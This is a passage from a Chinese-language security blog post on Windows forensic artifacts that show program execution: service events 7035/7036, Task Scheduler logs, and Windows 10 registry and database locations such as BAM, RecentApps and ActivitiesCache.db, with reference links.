<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027184400-36f3f80c-d9d5-1.png" alt="image.png"></p>
<h4 id="2-系统事件日志System-Log-7035-7036"><a href="#2-系统事件日志System-Log-7035-7036" class="headerlink" title="2) 系统事件日志System Log (7035/7036)"></a>2) 系统事件日志System Log (7035/7036)</h4><p>Windows XP/7/ Windows Server 2003,当服务启动或停止时，服务控制管理器会记录到系统事件日志中的ID 7035。因此，如果关联的进程被注册为服务，则可发现执行痕迹。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7035   Service Control Manager    xxx服务成功发送一个开始控件。</span><br><span class="line">7036   Service Control Manager    xxx服务处于 正在运行/停止 状态</span><br></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027184413-3e5efc9a-d9d5-1.png" alt="image.png"></p>
<h4 id="3-计划任务日志TaskScheduler"><a href="#3-计划任务日志TaskScheduler" class="headerlink" title="3) 计划任务日志TaskScheduler"></a>3) 计划任务日志TaskScheduler</h4><p>计划任务日志中也可能发现可执行文件执行的痕迹。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181027184424-452b0906-d9d5-1.png" alt="image.png"></p>
<h3 id="四、Win10特有功能"><a href="#四、Win10特有功能" class="headerlink" title="四、Win10特有功能"></a>四、Win10特有功能</h3><h4 id="1-RecentApps（win10）"><a href="#1-RecentApps（win10）" class="headerlink" title="1) RecentApps（win10）"></a>1) RecentApps（win10）</h4><p>Windows 10<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Microsoft\Windows\Current Version\Search\RecentApps</span><br></pre></td></tr></table></figure></p>
<h4 id="2-BAM-Background-Activity-Monitor-win10"><a href="#2-BAM-Background-Activity-Monitor-win10" class="headerlink" title="2) BAM/Background Activity Monitor (win10)"></a>2) BAM/Background Activity Monitor (win10)</h4><p>从Windows 10 1709 (Fall Creators update)版本开始引用。<br>注册表中位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\&#123;SID&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="3-ActivitiesCache-db（win10）"><a href="#3-ActivitiesCache-db（win10）" class="headerlink" title="3) ActivitiesCache.db（win10）"></a>3) ActivitiesCache.db（win10）</h4><p>从Windows 10 1803 (April 2018)版本开始引用。<br>文件路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;profile&gt;\AppData\Local\ConnectedDevicesPlatform\L.&lt;profile&gt;\ActivitiesCache.db</span><br></pre></td></tr></table></figure></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.1234n6.com/2018/10/available-artifacts-evidence-of.html?m=1" target="_blank" rel="noopener">https://blog.1234n6.com/2018/10/available-artifacts-evidence-of.html?m=1</a><br><a href="https://www.andreafortuna.org/dfir/forensic-artifacts-evidences-of-program-execution-on-windows-systems/" target="_blank" rel="noopener">https://www.andreafortuna.org/dfir/forensic-artifacts-evidences-of-program-execution-on-windows-systems/</a><br><a href="https://www.fireeye.com/blog/threat-research/2013/08/execute.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2013/08/execute.html</a><br><a href="https://www.andreafortuna.org/cybersecurity/amcache-and-shimcache-in-forensic-analysis/" target="_blank" rel="noopener">https://www.andreafortuna.org/cybersecurity/amcache-and-shimcache-in-forensic-analysis/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/ppl.jpg" alt="pplsec">
            
              <p class="site-author-name" itemprop="name">pplsec</p>
              <p class="site-description motion-element" itemprop="description">渗透测试 应急响应 代码审计</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">pplsec</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
